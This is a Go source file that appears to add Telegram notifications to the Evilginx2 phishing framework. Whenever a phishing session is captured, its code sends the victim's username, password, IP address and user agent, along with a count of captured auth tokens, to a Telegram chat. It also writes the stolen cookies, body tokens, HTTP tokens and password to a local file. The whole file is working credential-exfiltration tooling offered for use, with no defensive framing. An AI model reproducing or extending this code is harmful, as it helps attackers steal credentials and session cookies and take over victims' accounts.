package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type TelegramBot struct {
	BotToken string
	ChatId   string
}

type TelegramMessage struct {
	ChatId    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

type TelegramResponse struct {
	Ok     bool   `json:"ok"`
	Result string `json:"result"`
}

func NewTelegramBot() *TelegramBot {
	return &TelegramBot{}
}

func (t *TelegramBot) Setup(botToken string, chatId string) {
	t.BotToken = botToken
	t.ChatId = chatId
}

func (t *TelegramBot) SendSessionNotification(session *Session, sessionIndex int, phishletName string, cfgDir string) error {
	// Validate setup
	if t.BotToken == "" || t.ChatId == "" {
		return fmt.Errorf("telegram bot token or chat ID not configured")
	}

	// Check if session has meaningful data
	if !t.hasValidSessionData(session) {
		log.Debug("skipping telegram notification for empty session")
		return nil
	}

	// Generate cookies file if cookies exist
	cookiesFile := ""
	if len(session.CookieTokens) > 0 {
		cookiesFile = t.saveCookiesToFile(session, cfgDir)
	}

	// Format message
	message := t.formatSessionMessage(session, sessionIndex, phishletName, cookiesFile)

	// Send message
	return t.sendMessage(message)
}

func (t *TelegramBot) hasValidSessionData(session *Session) bool {
	// Check if session has username, password, or any tokens
	return session.Username != "" || 
		   session.Password != "" || 
		   len(session.CookieTokens) > 0 || 
		   len(session.BodyTokens) > 0 || 
		   len(session.HttpTokens) > 0
}

func (t *TelegramBot) formatSessionMessage(session *Session, sessionIndex int, phishletName string, cookiesFile string) string {
	var message strings.Builder
	
	message.WriteString("🎣 *Evilginx Session Captured*\n\n")
	message.WriteString(fmt.Sprintf("📊 *Session ID:* %d\n", sessionIndex))
	message.WriteString(fmt.Sprintf("🎯 *Phishlet:* %s\n", phishletName))
	message.WriteString(fmt.Sprintf("🌐 *IP Address:* %s\n", session.RemoteAddr))
	message.WriteString(fmt.Sprintf("🖥️ *User Agent:* %s\n", session.UserAgent))
	message.WriteString(fmt.Sprintf("⏰ *Time:* %s\n\n", time.Now().Format("2006-01-02 15:04:05")))

	// Add credentials if available
	if session.Username != "" {
		message.WriteString(fmt.Sprintf("👤 *Username:* %s\n", session.Username))
	}
	if session.Password != "" {
		message.WriteString(fmt.Sprintf("🔑 *Password:* %s\n", session.Password))
	}

	// Add custom fields
	if len(session.Custom) > 0 {
		message.WriteString("\n📝 *Custom Fields:*\n")
		for key, value := range session.Custom {
			message.WriteString(fmt.Sprintf("  • %s: %s\n", key, value))
		}
	}

	// Add token information
	tokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
	if tokenCount > 0 {
		message.WriteString(fmt.Sprintf("\n🍪 *Auth Tokens:* %d captured\n", tokenCount))
		
		if len(session.CookieTokens) > 0 {
			message.WriteString(fmt.Sprintf("  • Cookie tokens: %d\n", len(session.CookieTokens)))
		}
		if len(session.BodyTokens) > 0 {
			message.WriteString(fmt.Sprintf("  • Body tokens: %d\n", len(session.BodyTokens)))
		}
		if len(session.HttpTokens) > 0 {
			message.WriteString(fmt.Sprintf("  • HTTP tokens: %d\n", len(session.HttpTokens)))
		}
	}

	// Add cookies file info
	if cookiesFile != "" {
		message.WriteString(fmt.Sprintf("\n📁 *Cookies saved to:* %s\n", cookiesFile))
	}

	return message.String()
}

func (t *TelegramBot) saveCookiesToFile(session *Session, cfgDir string) string {
	// Generate random filename
	randomName := GenRandomAlphanumString(8)
	filename := fmt.Sprintf("%s.txt", randomName)
	
	// Create cookies directory if it doesn't exist
	cookiesDir := filepath.Join(cfgDir, "cookies")
	os.MkdirAll(cookiesDir, 0700)
	
	filePath := filepath.Join(cookiesDir, filename)
	
	// Format cookies data
	var cookiesData strings.Builder
	cookiesData.WriteString(fmt.Sprintf("Session ID: %s\n", session.Id))
	cookiesData.WriteString(fmt.Sprintf("Phishlet: %s\n", session.Name))
	cookiesData.WriteString(fmt.Sprintf("Username: %s\n", session.Username))
	cookiesData.WriteString(fmt.Sprintf("Password: %s\n", session.Password))
	cookiesData.WriteString(fmt.Sprintf("IP: %s\n", session.RemoteAddr))
	cookiesData.WriteString(fmt.Sprintf("User Agent: %s\n", session.UserAgent))
	cookiesData.WriteString(fmt.Sprintf("Timestamp: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
	
	// Add cookies
	if len(session.CookieTokens) > 0 {
		cookiesData.WriteString("=== COOKIES ===\n")
		for domain, cookies := range session.CookieTokens {
			cookiesData.WriteString(fmt.Sprintf("Domain: %s\n", domain))
			for name, cookie := range cookies {
				cookiesData.WriteString(fmt.Sprintf("  %s = %s\n", name, cookie.Value))
			}
			cookiesData.WriteString("\n")
		}
	}
	
	// Add body tokens
	if len(session.BodyTokens) > 0 {
		cookiesData.WriteString("=== BODY TOKENS ===\n")
		for name, value := range session.BodyTokens {
			cookiesData.WriteString(fmt.Sprintf("%s = %s\n", name, value))
		}
		cookiesData.WriteString("\n")
	}
	
	// Add HTTP tokens
	if len(session.HttpTokens) > 0 {
		cookiesData.WriteString("=== HTTP TOKENS ===\n")
		for name, value := range session.HttpTokens {
			cookiesData.WriteString(fmt.Sprintf("%s = %s\n", name, value))
		}
		cookiesData.WriteString("\n")
	}

	// Save to file
	err := ioutil.WriteFile(filePath, []byte(cookiesData.String()), 0600)
	if err != nil {
		log.Error("failed to save cookies to file: %v", err)
		return ""
	}

	return filename
}

func (t *TelegramBot) sendMessage(message string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.BotToken)
	
	telegramMsg := TelegramMessage{
		ChatId:    t.ChatId,
		Text:      message,
		ParseMode: "Markdown",
	}
	
	jsonData, err := json.Marshal(telegramMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal telegram message: %v", err)
	}
	
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send telegram message: %v", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("telegram API error: %s", string(body))
	}
	
	return nil
}

func (t *TelegramBot) Test() error {
	if t.BotToken == "" || t.ChatId == "" {
		return fmt.Errorf("telegram bot token or chat ID not configured")
	}
	
	testMessage := "🧪 *Evilginx Telegram Test*\n\nTelegram notifications are working correctly!"
	return t.sendMessage(testMessage)
} 